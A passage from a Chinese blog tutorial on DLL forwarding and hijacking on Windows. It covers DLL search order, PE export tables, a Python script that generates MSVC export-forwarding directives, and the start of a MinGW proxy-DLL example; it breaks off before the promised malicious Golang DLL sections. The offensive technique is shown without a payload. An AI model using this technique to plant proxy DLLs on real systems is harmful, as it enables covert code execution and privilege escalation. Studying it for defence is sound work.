<a href=#%e7%bb%99-msvc-%e9%93%be%e6%8e%a5%e5%99%a8%e7%94%9f%e6%88%90%e5%af%bc%e5%87%ba%e6%8c%87%e4%bb%a4 aria-label="给 MSVC 链接器生成导出指令">给 MSVC 链接器生成导出指令</a></li></ul>
</li>
<li>
<a href=#dll-%e8%bd%ac%e5%8f%91dll-%e5%8a%ab%e6%8c%81%e7%9a%84-mingw-%e5%ae%9e%e7%8e%b0 aria-label="dll 转发（dll 劫持）的 mingw 实现">dll 转发（dll 劫持）的 mingw 实现</a><ul>
<li>
<a href=#def-%e6%96%87%e4%bb%b6%e4%bb%8b%e7%bb%8d aria-label="def 文件介绍">def 文件介绍</a></li>
<li>
<a href=#%e7%ae%80%e5%8d%95%e7%9a%84%e7%a4%ba%e4%be%8b aria-label=简单的示例>简单的示例</a><ul>
<li>
<a href=#%e5%ae%9e%e7%8e%b0%e6%b5%81%e7%a8%8b aria-label=实现流程>实现流程</a></li>
<li>
<a href=#def-%e5%92%8c-exp-%e6%96%87%e4%bb%b6 aria-label=".def 和 .exp 文件">.def 和 .exp 文件</a></li>
<li>
<a href=#%e9%a2%9d%e5%a4%96%e7%9a%84%e8%af%b4%e6%98%8e aria-label=额外的说明>额外的说明</a></li></ul>
</li></ul>
</li>
<li>
<a href=#%e6%88%91%e4%bb%ac%e5%a6%82%e4%bd%95%e7%94%a8-golang-%e6%9d%a5%e5%ae%9e%e7%8e%b0%e8%bd%ac%e5%8f%91-dll aria-label="我们如何用 Golang 来实现转发 dll">我们如何用 Golang 来实现转发 dll</a><ul>
<li>
<a href=#%e5%b0%9d%e8%af%95%e4%b8%8e%e6%80%9d%e8%80%83 aria-label=尝试与思考>尝试与思考</a></li>
<li>
<a href=#golang-%e4%b8%ad%e7%9a%84%e5%ae%9e%e7%8e%b0 aria-label="golang 中的实现">golang 中的实现</a></li></ul>
</li>
<li>
<a href=#dll-%e8%bd%ac%e5%8f%91%e7%9a%84%e6%80%bb%e7%bb%93 aria-label="dll 转发的总结">dll 转发的总结</a></li>
<li>
<a href=#%e5%9c%a8-golang-%e4%b8%ad%e5%a6%82%e4%bd%95%e5%ae%9e%e7%8e%b0%e6%81%b6%e6%84%8f-dll aria-label="在 Golang 中如何实现恶意 dll">在 Golang 中如何实现恶意 dll</a><ul>
<li>
<a href=#init-%e5%86%99%e6%b3%95 aria-label="init 写法">init 写法</a></li>
<li>
<a href=#%e5%af%b9%e4%ba%8e-windows-dll-%e6%9b%b4%e7%bb%86%e7%b2%92%e5%ba%a6%e7%9a%84%e6%8e%a7%e5%88%b6 aria-label="对于 windows dll 更细粒度的控制">对于 windows dll 更细粒度的控制</a><ul>
<li>
<a href=#c-%e5%ae%9e%e7%8e%b0-dllmain aria-label="c 实现 DllMain">c 实现 DllMain</a></li>
<li>
<a href=#golang-%e6%81%b6%e6%84%8f%e4%bb%a3%e7%a0%81 aria-label="Golang 恶意代码">Golang 恶意代码</a></li>
<li>
<a href=#%e7%bb%84%e5%90%88-golang-%e5%92%8c-c-%e7%bc%96%e8%af%91 aria-label="组合 Golang 和 c 编译">组合 Golang 和 c 编译</a><ul>
<li>
<a href=#%e7%ac%ac%e4%b8%80%e7%a7%8d%e6%96%b9%e6%a1%88 aria-label=第一种方案>第一种方案</a></li>
<li>
<a href=#%e7%ac%ac%e4%ba%8c%e7%a7%8d%e6%96%b9%e6%a1%88 aria-label=第二种方案>第二种方案</a></li></ul>
</li></ul>
</li>
<li>
<a href=#%e5%af%bc%e5%87%ba%e8%a1%a8%e7%9a%84%e9%97%ae%e9%a2%98 aria-label=导出表的问题>导出表的问题</a></li></ul>
</li>
<li>
<a href=#%e6%9c%80%e5%90%8e%e7%9a%84%e6%9c%80%e5%90%8e aria-label=最后的最后>最后的最后</a></li>
<li>
<a href=#%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99 aria-label=参考资料>参考资料</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><p>本文章将讲解如何使用恶意的 Golang 来实现 dll 劫持转发</p>
<h2 id=dll-转发概述>dll 转发概述<a hidden class=anchor aria-hidden=true href=#dll-转发概述>#</a></h2>
<p>dll 转发: 攻击者使用恶意dll替换原始dll，重命名原始dll并通过恶意dll将原先的功能转发至原始dll。</p>
<p>该恶意dll一般用来专门执行攻击者希望拦截或修改的功能，同时将所有其他功能转发至原始dll</p>
<p>一般可与 dll 劫持共同使用。</p>
<h3 id=dll-搜索顺序>dll 搜索顺序<a hidden class=anchor aria-hidden=true href=#dll-搜索顺序>#</a></h3>
<p>首先我们来看一下 Windows 系统中 dll 的搜索顺序</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/2e641029d3db1fd7d8529c14688e18f1..png alt="enter description here">
</p>
<p>上图中攻击者可以控制的就是<strong>标准搜索顺序</strong>中的步骤，根据情况的不同我们可以选择不同的方式来进行 dll 劫持</p>
<h3 id=步骤>步骤<a hidden class=anchor aria-hidden=true href=#步骤>#</a></h3>
<p>要实现 dll 转发，一般需要以下一些步骤</p>
<ol>
<li>解析原始 dll 的导出表</li>
<li>收集出要拦截修改的函数</li>
<li>在恶意 dll 中实现拦截功能</li>
<li>将所有其他函数转发至原始 dll 上</li>
<li>重命名原始 dll</li>
<li>使用原始 dll 的名称重命名恶意 dll</li>
</ol>
<h2 id=pe-文件导出表>PE 文件导出表<a hidden class=anchor aria-hidden=true href=#pe-文件导出表>#</a></h2>
<h3 id=什么是-pe-导出表>什么是 PE 导出表？<a hidden class=anchor aria-hidden=true href=#什么是-pe-导出表>#</a></h3>
<p>导出表就是当前的 PE 文件提供了哪些函数给别人调用。</p>
<p>并不只有 dll 才有导出表，所有的 PE 文件都可以有导出表，exe 也可以导出函数给别人使用，一般情况而言 exe 没有，但并不是不可以有</p>
<h3 id=导出表在哪里>导出表在哪里？<a hidden class=anchor aria-hidden=true href=#导出表在哪里>#</a></h3>
<p>PE 文件格式在这里并不进行详细介绍，感兴趣的读者可以自行查阅相关资料。</p>
<p>PE 文件包含 DOS 头和 PE 头，PE 头里面有一个扩展头，这里面包含了一个数据目录（包含每个目录的VirtualAddress和Size的数组。目录包括：导出、导入、资源、调试等），从这个地方我们就能够定位到导出表位于哪里</p>
<h3 id=导出表的结构>导出表的结构<a hidden class=anchor aria-hidden=true href=#导出表的结构>#</a></h3>
<p>接下来我们看看导出表的结构</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;      <span style=color:#75715e>//时间戳.  编译的时间. 把秒转为时间.可以知道这个DLL是什么时候编译出来的.
</span><span style=color:#75715e></span>    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;　　　　　　　　　　　<span style=color:#75715e>//指向该导出表文件名的字符串,也就是这个DLL的名称  辅助信息.修改不影响  存储的RVA 如果想在文件中查看.自己计算一下FOA即可.
</span><span style=color:#75715e></span>    DWORD   Base; 　　　　　　　　　　<span style=color:#75715e>// 导出函数的起始序号
</span><span style=color:#75715e></span>    DWORD   NumberOfFunctions;     <span style=color:#75715e>//所有的导出函数的个数
</span><span style=color:#75715e></span>    DWORD   NumberOfNames;         <span style=color:#75715e>//以名字导出的函数的个数
</span><span style=color:#75715e></span>    DWORD   AddressOfFunctions;     <span style=color:#75715e>// 导出的函数地址的 地址表  RVA  也就是 函数地址表  
</span><span style=color:#75715e></span>    DWORD   AddressOfNames;         <span style=color:#75715e>// 导出的函数名称表的  RVA      也就是 函数名称表
</span><span style=color:#75715e></span>    DWORD   AddressOfNameOrdinals;  <span style=color:#75715e>// 导出函数序号表的RVA         也就是 函数序号表
</span><span style=color:#75715e></span>} IMAGE_EXPORT_DIRECTORY, <span style=color:#f92672>*</span>PIMAGE_EXPORT_DIRECTORY;
</code></pre></td></tr></table>
</div>
</div><p>我们使用cff explorer看看dll的导出表</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/95a2925ce17671ff9d1e3c2b0021323e..png alt="enter description here">
</p>
<p>可惜从这个图上我们并不能观察出导出的函数是否是一个转发函数，我们使用16进制编辑器打开看看</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/4c0dc9ac1845469be583939b600845e2..png alt="enter description here">
</p>
<p>从这个图上我们可以看到 add 导出函数前面还有一些东西 <code>_lyshark.dll._lyshark.add.add</code></p>
<p>这个标识告诉我们这个 dll 的导出函数 add 实际上位于 _lyshark.dll 上</p>
<h2 id=dll-转发如何工作>dll 转发如何工作<a hidden class=anchor aria-hidden=true href=#dll-转发如何工作>#</a></h2>
<p>当我们调用转发函数时，Windows加载程序将检查该 dll（即恶意 dll）所引用的 dll（即原始dll）是否已加载，如果引用的 dll 还没有加载到内存中，Windows加载程序将加载这个引用的 dll，最后搜索该导出函数的真实地址，以便我们调用它</p>
<h2 id=dll-转发dll-劫持的一般实现>dll 转发（dll 劫持）的一般实现<a hidden class=anchor aria-hidden=true href=#dll-转发dll-劫持的一般实现>#</a></h2>
<p>我们能在网上搜索到一些 dll 转发（dll 劫持）的实现，基本是使用微软 MSVC 编译器的特殊能力<a href=#refer-anchor><sup>4</sup></a></p>
<p>MSVC 支持在 cpp 源文件中写一些链接选项，类似</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#progma comment(linker, &#34;/export:FUNCTION_NAME=要转发的dll文件名.FUNCTION_NAME&#34;)
</span></code></pre></td></tr></table>
</div>
</div><h3 id=列出导出函数>列出导出函数<a hidden class=anchor aria-hidden=true href=#列出导出函数>#</a></h3>
<p>下面我们采用 MSVC 对 zlib.dll 实现一个样例<a href=#refer-anchor><sup>5</sup></a></p>
<p>首先我们能使用 <a href=http://www.nirsoft.net/utils/dll_export_viewer.html>DLL Export Viewer</a> 工具查看并导出一个 dll 的导出表</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/154cf49bb2dbb0b91a70db8e9f2c06bf..png alt="enter description here">
</p>
<p>然后我们点击 <code>View > HTML Report - All Functions</code></p>
<p>我们可以得到一个类似于下面的 html</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/9ec0607a860fbc3b7dc5e168cefa07be..png alt="enter description here">
</p>
<h3 id=给-msvc-链接器生成导出指令>给 MSVC 链接器生成导出指令<a hidden class=anchor aria-hidden=true href=#给-msvc-链接器生成导出指令>#</a></h3>
<p>我们现在可以把这个 html 转化为 MSVC 的导出指令<a href=#refer-anchor><sup>5</sup></a></p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#e6db74>&#34;&#34;&#34;
</span><span style=color:#e6db74>The report generated by DLL Exported Viewer is not properly formatted so it can&#39;t be analyzed using a parser unfortunately.
</span><span style=color:#e6db74>&#34;&#34;&#34;</span>
<span style=color:#f92672>from</span> __future__ <span style=color:#f92672>import</span> print_function
<span style=color:#f92672>import</span> argparse

<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
    parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(description<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;DLL Export Viewer - Report Parser&#34;</span>)
    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#34;report&#34;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;the HTML report generated by DLL Export Viewer&#34;</span>)
    args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
    report <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>report

    <span style=color:#66d9ef>try</span>:
        f <span style=color:#f92672>=</span> open(report)
        page <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
        f<span style=color:#f92672>.</span>close()
    <span style=color:#66d9ef>except</span>:
        print(<span style=color:#e6db74>&#34;[-] ERROR: open(&#39;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#39;)&#34;</span> <span style=color:#f92672>%</span> report)
        <span style=color:#66d9ef>return</span>

    <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> page:
        <span style=color:#66d9ef>if</span> line<span style=color:#f92672>.</span>startswith(<span style=color:#e6db74>&#34;&lt;tr&gt;&#34;</span>):
            cols <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34;&lt;tr&gt;&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;&lt;td bgcolor=#FFFFFF nowrap&gt;&#34;</span>)
            function_name <span style=color:#f92672>=</span> cols[<span style=color:#ae81ff>1</span>]
            ordinal <span style=color:#f92672>=</span> cols[<span style=color:#ae81ff>4</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39; &#39;</span>)[<span style=color:#ae81ff>0</span>]
            dll_orig <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>_orig&#34;</span> <span style=color:#f92672>%</span> cols[<span style=color:#ae81ff>5</span>][:cols[<span style=color:#ae81ff>5</span>]<span style=color:#f92672>.</span>rfind(<span style=color:#e6db74>&#39;.&#39;</span>)]
            print(<span style=color:#e6db74>&#34;#pragma comment(linker,</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>/export:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>=</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>.</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>,@</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)&#34;</span> <span style=color:#f92672>%</span> (function_name, dll_orig, function_name, ordinal))

<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
    main()
</code></pre></td></tr></table>
</div>
</div><p>然后我们可以获得这样的输出</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/110e5fe2293d95b21716d025ede9ae8e..png alt="enter description here">
</p>
<p>下面的具体怎么生成不再进行介绍，如果感兴趣可以查看 <a href=https://itm4n.github.io/dll-proxying/>Windows Privilege Escalation - DLL Proxying</a> 或 <a href=https://www.write-bug.com/article/1883.html>基于AheadLib工具进行DLL劫持</a></p>
<h2 id=dll-转发dll-劫持的-mingw-实现>dll 转发（dll 劫持）的 mingw 实现<a hidden class=anchor aria-hidden=true href=#dll-转发dll-劫持的-mingw-实现>#</a></h2>
<p>如果有的人和我一样，不喜欢安装庞大的 Visual Studio，习惯用 gcc mingw 来完成，我们也是能够完成的</p>
<h3 id=def-文件介绍>def 文件介绍<a hidden class=anchor aria-hidden=true href=#def-文件介绍>#</a></h3>
<p>这里我们使用 <a href=https://gcc.gnu.org/>gcc</a> 编译器和 <a href=http://mingw-w64.org/doku.php>mingw-w64</a>（这个是mingw的改进版）</p>
<p>此处我们不再采用直接把链接指令写入代码源文件的方式，而是采用<a href="https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=msvc-160">模块定义文件</a> (.Def)</p>
<p>模块定义 (.def) 文件为链接器提供有关导出、属性和有关要链接的程序的其他信息的信息。.def 文件在构建 DLL 比较有用。详情可参见 <a href="https://docs.microsoft.com/en-us/cpp/build/reference/module-definition-dot-def-files?view=msvc-160">MSDN Module-Definition (.Def) Files</a></p>
<p>当然，我们采用这种方式的原因是因为 .def 能被 mingw-w64 所支持，我们要做的就是在.def文件中写入我们要转发到原始dll的所有函数的列表，并在编译dll的时候在GCC中设置该 .def 文件参与链接。</p>
<h3 id=简单的示例>简单的示例<a hidden class=anchor aria-hidden=true href=#简单的示例>#</a></h3>
<h4 id=实现流程>实现流程<a hidden class=anchor aria-hidden=true href=#实现流程>#</a></h4>
<p>这里我们采用一个简单的样例，我们采用常规写了一个 dll, 该 dll 文件导出一个 add 函数，该导出函数的作用就是把传入的两个数值进行相加</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>extern</span> <span style=color:#e6db74>&#34;C&#34;</span> <span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__declspec</span>(dllexport)add(<span style=color:#66d9ef>int</span> x, <span style=color:#66d9ef>int</span> y)
{
	<span style=color:#66d9ef>return</span> x <span style=color:#f92672>+</span> y;
}

BOOL APIENTRY <span style=color:#a6e22e>DllMain</span>(HANDLE handle, DWORD dword, LPVOID lpvoid)
{

	<span style=color:#66d9ef>return</span> true;
}
</code></pre></td></tr></table>
</div>
</div><p>我们将它编译成 dll 文件</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc add.cpp -shared -o add.dll
</code></pre></td></tr></table>
</div>
</div><p>然后我们写一个主程序来调用它</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
</span><span style=color:#75715e></span>
<span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>int</span>(<span style=color:#f92672>*</span>lpAdd)(<span style=color:#66d9ef>int</span>, <span style=color:#66d9ef>int</span>);

<span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>argv[])
{
	HINSTANCE DllAddr;
	lpAdd addFun;

	DllAddr <span style=color:#f92672>=</span> LoadLibraryW(<span style=color:#e6db74>L</span><span style=color:#e6db74>&#34;add.dll&#34;</span>);

	addFun <span style=color:#f92672>=</span> (lpAdd)GetProcAddress(DllAddr, <span style=color:#e6db74>&#34;add&#34;</span>);
	<span style=color:#66d9ef>if</span> (NULL <span style=color:#f92672>!=</span> addFun)
	{
		<span style=color:#66d9ef>int</span> res <span style=color:#f92672>=</span> addFun(<span style=color:#ae81ff>100</span>, <span style=color:#ae81ff>200</span>);
		printf(<span style=color:#e6db74>&#34;result: %d </span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, res);
	}

	FreeLibrary(DllAddr);
	system(<span style=color:#e6db74>&#34;pause&#34;</span>);
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></td></tr></table>
</div>
</div><p>然后我们进行编译执行</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gcc main.cpp -o main.exe
./main.exe
</code></pre></td></tr></table>
</div>
</div><p>可以看到如下输出</p>
<p><img loading=lazy src=https://raw.githubusercontents.com/akkuman/pic/master/pic/2021/8/aa70cfe03369503bbd2d14f646e736a3..png alt="enter description here">
</p>
<p>然后我们将我们刚才生成的 add.dll 重命名为 _add.dll</p>
<p>然后创建一个 .def 文件</p>
<p>functions.def</p>
<div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
<pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td>
<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
